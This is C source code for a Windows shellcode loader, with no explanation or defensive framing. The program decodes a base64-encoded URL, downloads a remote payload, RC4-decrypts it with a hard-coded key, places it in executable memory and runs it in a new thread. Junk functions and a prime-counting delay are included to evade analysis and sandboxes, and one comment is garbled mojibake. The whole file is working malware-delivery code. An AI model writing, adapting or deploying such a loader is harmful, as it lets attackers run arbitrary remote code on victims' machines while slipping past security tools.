#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

// RC4 encryption function (obfuscated)
void obfuscated_encrypt(unsigned char* data, size_t data_len, unsigned char* key);

// RC4 decryption function (obfuscated)
void obfuscated_decrypt(unsigned char* data, size_t data_len, unsigned char* key);

// Base64 decoding function
int base64_decode(const char* base64, unsigned char* out, size_t* out_len) {
    static const unsigned char base64_table[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = strlen(base64);
    if (len % 4 != 0) return -1;  // Length of base64 encoded string should be a multiple of 4

    *out_len = len / 4 * 3;
    if (base64[len - 1] == '=') (*out_len)--;
    if (base64[len - 2] == '=') (*out_len)--;

    for (size_t i = 0, j = 0; i < len;) {
        uint32_t sextet_a = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
        uint32_t sextet_b = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
        uint32_t sextet_c = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
        uint32_t sextet_d = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;

        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;

        if (j < *out_len) out[j++] = (triple >> 16) & 0xFF;
        if (j < *out_len) out[j++] = (triple >> 8) & 0xFF;
        if (j < *out_len) out[j++] = triple & 0xFF;
    }

    return 0;
}

// Useless function
void useless_function() {
    int x = rand() % 10;
    if (x > 10) {
        printf("Useless branch\n");
    }
    else if (x < 0) {
        printf("Another useless branch\n");
    }
    else {
        // Do nothing
    }
}

// Prime enumeration function to delay execution
void delay_execution() {
    for (int i = 2; i <= 2000000; ++i) {
        int isPrime = 1; // Use int instead of bool
        for (int j = 2; j <= sqrt(i); ++j) {
            if (i % j == 0) {
                isPrime = 0; // Use 0 for false
                break;
            }
        }
    }
}

// Function to download payload from remote server using WinHTTP
unsigned char* download_payload(const wchar_t* url, size_t* payload_size) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    unsigned char* payload = NULL;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;

    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t hostName[256];
    wchar_t urlPath[256];

    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) {
        fprintf(stderr, "WinHttpCrackUrl failed\n");
        return NULL;
    }

    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen failed\n");
        return NULL;
    }

    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect failed\n");
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest failed\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        fprintf(stderr, "WinHttpSendRequest failed\n");
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        fprintf(stderr, "WinHttpReceiveResponse failed\n");
    }

    if (bResults) {
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                fprintf(stderr, "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }

            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                fprintf(stderr, "Out of memory\n");
                dwSize = 0;
            }
            else {
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                    fprintf(stderr, "Error %u in WinHttpReadData.\n", GetLastError());
                }
                else {
                    payload = (unsigned char*)realloc(payload, *payload_size + dwDownloaded);
                    memcpy(payload + *payload_size, pszOutBuffer, dwDownloaded);
                    *payload_size += dwDownloaded;
                }
                free(pszOutBuffer);
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return payload;
}

int main(int argc, char* argv[]) {

    // Delay execution by enumerating primes
    //delay_execution();

    // Useless function call
    useless_function();

    // Base64 encoded URL
    const char* encoded_url = "5L2g5ZKL5Zue5LqL5bCP5LyZ5a2Q5oOz5bmy5Zib"; //base64±àÂëºóµÄurl

    // Decode the base64 URL
    size_t url_len = strlen(encoded_url);
    size_t decoded_url_len = url_len / 4 * 3;
    if (encoded_url[url_len - 1] == '=') decoded_url_len--;
    if (encoded_url[url_len - 2] == '=') decoded_url_len--;

    // Allocate memory for the decoded URL
    unsigned char* decoded_url = (unsigned char*)malloc(decoded_url_len + 1);
    if (decoded_url == NULL) {
        fprintf(stderr, "Failed to allocate memory for decoded URL\n");
        return 1;
    }

    size_t out_len = 0;
    if (base64_decode(encoded_url, decoded_url, &out_len) != 0) {
        fprintf(stderr, "Failed to decode base64 URL\n");
        free(decoded_url);
        return 1;
    }
    decoded_url[out_len] = '\0';

    // Convert the decoded URL to a wide character string
    size_t decoded_url_wchar_len = MultiByteToWideChar(CP_UTF8, 0, (char*)decoded_url, -1, NULL, 0);
    wchar_t* decoded_url_wchar = (wchar_t*)malloc(decoded_url_wchar_len * sizeof(wchar_t));
    if (decoded_url_wchar == NULL) {
        fprintf(stderr, "Failed to allocate memory for wide char URL\n");
        free(decoded_url);
        return 1;
    }
    MultiByteToWideChar(CP_UTF8, 0, (char*)decoded_url, -1, decoded_url_wchar, decoded_url_wchar_len);
    free(decoded_url);

    size_t payload_size = 0;
    unsigned char* obfuscated_payload = download_payload(decoded_url_wchar, &payload_size);
    free(decoded_url_wchar);

    if (!obfuscated_payload) {
        fprintf(stderr, "Failed to download payload\n");
        return 1;
    }

    // Decryption key (example: 16 bytes key)
    unsigned char key[] = "thisIsA16ByteKey";  // Replace with your key

    // Decrypt payload
    obfuscated_decrypt(obfuscated_payload, payload_size, key);

    // Allocate memory with execute permission
    PVOID pAddress = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAddress == NULL) {
        fprintf(stderr, "VirtualAlloc failed, error code: %lu\n", GetLastError());
        free(obfuscated_payload);
        return 1;
    }

    // Copy decrypted payload to allocated memory
    memcpy(pAddress, obfuscated_payload, payload_size);

    // Create a thread to execute the payload
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "CreateThread failed, error code: %lu\n", GetLastError());
        free(obfuscated_payload);
        return 1;
    }

    // Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    free(obfuscated_payload);
    return 0;
}

// Obfuscated RC4 encryption function implementation
void obfuscated_encrypt(unsigned char* data, size_t data_len, unsigned char* key) {
    int i = 0, j = 0;
    unsigned char S[256];
    unsigned char T[256];

    // Key-scheduling algorithm (KSA)
    for (i = 0; i < 256; i++) {
        S[i] = i;
        T[i] = key[i % strlen((char*)key)];
    }

    for (i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + T[i]) % 256;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    // Pseudo-random generation algorithm (PRGA) & encryption
    i = j = 0;
    for (size_t n = 0; n < data_len; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        unsigned char k = S[(S[i] + S[j]) % 256];
        data[n] ^= k;
    }
}

// Obfuscated RC4 decryption function implementation
void obfuscated_decrypt(unsigned char* data, size_t data_len, unsigned char* key) {
    // Encryption and decryption in RC4 is the same operation
    obfuscated_encrypt(data, data_len, key);
}
